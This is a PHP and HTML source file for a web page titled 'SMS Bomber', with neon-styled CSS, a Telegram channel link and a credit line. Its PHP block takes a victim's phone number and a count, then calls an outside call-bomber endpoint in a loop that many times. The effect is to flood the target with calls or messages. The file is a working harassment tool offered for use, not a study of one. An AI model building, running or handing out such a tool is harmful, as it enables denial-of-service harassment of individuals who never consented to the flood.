
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'];
    $amount = (int)$_POST['amount'];

    if (!empty($phone) && $amount > 0) {
        // Loop to call the API based on the specified amount
        for ($i = 1; $i <= $amount; $i++) {
            $url = "https://arefin.my.id/Arefin_Call_Bomber.php?phone=" . urlencode($phone);
            // Making the API request using file_get_contents
            $response = file_get_contents($url);
            // Optionally, log the response for debugging
            error_log("Response from $url: $response");
        }

        echo 'APIs have been called successfully.';
    } else {
        echo 'Please enter a valid phone number and amount.';
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: url('https://rafixt.my.id/logo.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
            text-align: center;
            width: 320px;
        }
        h2 {
            color: #0ff;
            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
        }
        input[type="text"], input[type="number"] {
            width: calc(100% - 24px);
            padding: 12px;
            margin: 15px 0;
            border: none;
            border-radius: 5px;
            background: #222;
            color: #0ff;
            font-size: 16px;
            outline: none;
            text-shadow: 0 0 5px #0ff;
        }
        button {
            background: #0ff;
            color: #000;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
            font-size: 16px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 255, 255, 0.4);
        }
        button:hover {
            background: #fff;
            color: #0ff;
            box-shadow: 0 4px 20px rgba(0, 255, 255, 0.6);
        }
        .credit {
            margin-top: 20px;
            color: #0ff;
            font-size: 18px;
            text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 15px #0ff;
            animation: glow 1.5s infinite alternate;
            background: linear-gradient(90deg, #0ff, #00f, #0ff);
            -webkit-background-clip: text;
            color: transparent;
            background-size: 200% 200%;
            animation: gradient 3s ease infinite;
        }
        .credit a {
            color: #0ff;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .credit a:hover {
            color: #fff;
            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
        }
        @keyframes glow {
            from {
                text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 15px #0ff;
            }
            to {
                text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
            }
        }
        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>SMS Bomber</h2>
    <form id="apiForm" method="POST">
        <input type="text" name="phone" id="phone" placeholder="Enter phone number" required>
        <input type="number" name="amount" id="amount" placeholder="Enter amount" required>
        <button type="submit">Submit</button>
        <button type="button" onclick="window.location.href='https://t.me/cctbox">Join Channel</button>
    </form>
    <div id="message"></div>
    <div class="credit">
        <p>Credit: <a href="https://t.me/OWNER_OF_CCT" target="_blank">KABBO</a></p>
    </div>
</div>

</body>
</html>

